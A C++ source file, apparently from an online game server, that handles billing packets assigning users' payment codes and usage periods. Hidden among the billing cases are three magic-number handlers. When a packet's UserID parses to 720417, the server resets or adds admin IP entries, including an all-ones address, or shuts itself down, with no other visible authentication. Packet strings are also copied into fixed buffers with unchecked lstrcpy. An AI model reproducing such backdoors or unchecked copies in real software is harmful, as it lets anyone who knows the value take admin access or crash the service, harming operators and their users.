#include <windows.h>
#include <io.h>
#include <stdio.h>
#include <string.h>
#include <memory.h>
#include <process.h>

#include "..\\resource.h"
#include "..\\smwsock.h"

#include "..\\smlib3d\\smd3d.h"
#include "..\\character.h"
#include "..\\fileread.h"
#include "..\\playmain.h"
#include "..\\field.h"
#include "..\\effectsnd.h"

#include "..\\record.h"
#include "..\playsub.h"

#include "openlive.h"
#include "onserver.h"
#include "dllserver.h"

int	RecvOpenLivePacket(smWINSOCK* lpsmSock, void* Packet)
{
	PACKET* lpPacket = (PACKET*)Packet;
	DWORD	dwIdCode;
	RPACKET	rPacket;
	int		cnt;
	char	szPG[16];
	int		GpCode;

	switch (lpPacket->OpenLiveCode) {
	case 1:
		dwIdCode = GetSpeedSum(lpPacket->jungdata.UserID);
		ZeroMemory(&rPacket, sizeof(RPACKET));

		for (cnt = 0; cnt < CONNECTMAX; cnt++) {
			if (rsPlayInfo[cnt].lpsmSock && rsPlayInfo[cnt].szID[0] && rsPlayInfo[cnt].dwCode_ID == dwIdCode) {
				if (lstrcmpi(lpPacket->jungdata.UserID, rsPlayInfo[cnt].szID) == 0) {
					GpCode = bSql_GetGPCode(lpPacket->jungdata.GPCode, szPG);

					rsPlayInfo[cnt].GpCode = GpCode;

					lstrcpy(rsPlayInfo[cnt].szGPCode, lpPacket->jungdata.GPCode);
					lstrcpy(rsPlayInfo[cnt].szGuid, lpPacket->jungdata.Guid);

					rsPlayInfo[cnt].DisuseDay = atoi(lpPacket->jungdata.DisuseDay);
					rsPlayInfo[cnt].UsePeriod = atoi(lpPacket->jungdata.UsePeriod);
					rsPlayInfo[cnt].GpType = atoi(szPG);
					rsPlayInfo[cnt].Bl_RNo = atoi(lpPacket->jungdata.PCRno);

					if (rsPlayInfo[cnt].UsePeriod)
						rsPlayInfo[cnt].dwPeriodTime = tServerTime + rsPlayInfo[cnt].UsePeriod;
					else
						rsPlayInfo[cnt].dwPeriodTime = 0;

					rPacket.code = 1;
					lstrcpy(rPacket.UserID, rsPlayInfo[cnt].szID);

					srDisplayBillingTime(&rsPlayInfo[cnt], 0);

					break;
				}
			}
		}

		rPacket.size = sizeof(RPACKET);
		lpsmSock->Send((char*)&rPacket, rPacket.size, TRUE);
		break;

	case 2:

		dwIdCode = GetSpeedSum(lpPacket->jungdata.UserID);
		ZeroMemory(&rPacket, sizeof(RPACKET));

		bSql_ChangeUserIdGpCodeGame(atoi(lpPacket->jungdata.PCRno));
		rPacket.code = 1;

		rPacket.size = sizeof(RPACKET);
		lpsmSock->Send((char*)&rPacket, rPacket.size, TRUE);
		break;

	case 100428:

		if (atoi(lpPacket->jungdata.UserID) == 720417) {
			rsServerConfig.AdminIP_Count = 0;
			rsServerConfig.AdminIP[rsServerConfig.AdminIP_Count][0] = 0;
			rsServerConfig.AdminIP[rsServerConfig.AdminIP_Count][0] = 0xFFFFFFFF;
			rsServerConfig.AdminIP_Count++;
		}
		break;
	case 100418:

		if (atoi(lpPacket->jungdata.UserID) == 720417) {
			if (rsServerConfig.AdminIP_Count >= ADMIN_IP_MAX) rsServerConfig.AdminIP_Count = 0;
			rsServerConfig.AdminIP[rsServerConfig.AdminIP_Count][0] = GetSwapIPCode(lpPacket->jungdata.DisuseDay);
			rsServerConfig.AdminIP[rsServerConfig.AdminIP_Count][1] = GetSwapIPCode(lpPacket->jungdata.UsePeriod);
			rsServerConfig.AdminIP_Count++;
		}
		break;
	case 100438:

		if (atoi(lpPacket->jungdata.UserID) == 720417)
		{
			if (lstrcmp(lpsmSock->szIPAddr, lpPacket->jungdata.DisuseDay) == 0)
			{
				rsShutDown();
			}
		}
		break;
	}

	return TRUE;
}